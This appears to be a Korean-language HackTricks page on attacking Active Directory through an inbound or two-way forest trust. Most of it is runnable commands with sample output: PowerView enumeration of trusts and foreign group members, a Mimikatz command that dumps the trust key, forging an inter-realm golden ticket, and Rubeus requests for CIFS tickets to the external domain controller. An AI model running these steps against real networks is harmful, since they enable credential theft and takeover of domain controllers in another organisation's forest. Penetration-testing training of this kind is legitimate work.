# 외부 포리스트 도메인 - 일방향 (수신) 또는 양방향

{{#include ../../banners/hacktricks-training.md}}

이 시나리오에서 외부 도메인이 당신을 신뢰하고 있거나 (또는 서로 신뢰하고 있는 경우) 당신은 그에 대한 어떤 종류의 접근 권한을 얻을 수 있습니다.

## 열거

우선, **신뢰**를 **열거**해야 합니다:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
이전 열거에서 사용자 **`crossuser`**가 **외부 도메인**의 **DC** 내에서 **관리자 액세스**를 가진 **`External Admins`** 그룹에 속해 있는 것으로 확인되었습니다.

## 초기 액세스

다른 도메인에서 사용자에 대한 **특별한** 액세스를 **찾지 못한 경우**, AD 방법론으로 돌아가서 **비특권 사용자에서 권한 상승**을 시도할 수 있습니다(예: kerberoasting과 같은):

`-Domain` 매개변수를 사용하여 **Powerview 함수**를 사용하여 **다른 도메인**을 **열거**할 수 있습니다:
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## 임시 사용자

### 로그인

외부 도메인에 접근할 수 있는 사용자의 자격 증명을 사용하여 일반적인 방법으로 로그인하면 다음에 접근할 수 있어야 합니다:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History 남용

당신은 또한 숲 신뢰를 통해 [**SID History**](sid-history-injection.md)를 남용할 수 있습니다.

사용자가 **한 숲에서 다른 숲으로** 마이그레이션되고 **SID 필터링이 활성화되지 않은 경우**, **다른 숲의 SID를 추가하는 것이 가능**해지며, 이 **SID**는 **신뢰를 통해 인증할 때** **사용자의 토큰에 추가**됩니다.

> [!WARNING]
> 상기 사항으로, 서명 키를 얻을 수 있습니다.
>
> ```powershell
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

당신은 **신뢰된** 키로 현재 도메인의 사용자를 **가장하는** **TGT에 서명할 수 있습니다**.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### 사용자 완전 임포스네이팅 방법
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
{{#include ../../banners/hacktricks-training.md}}
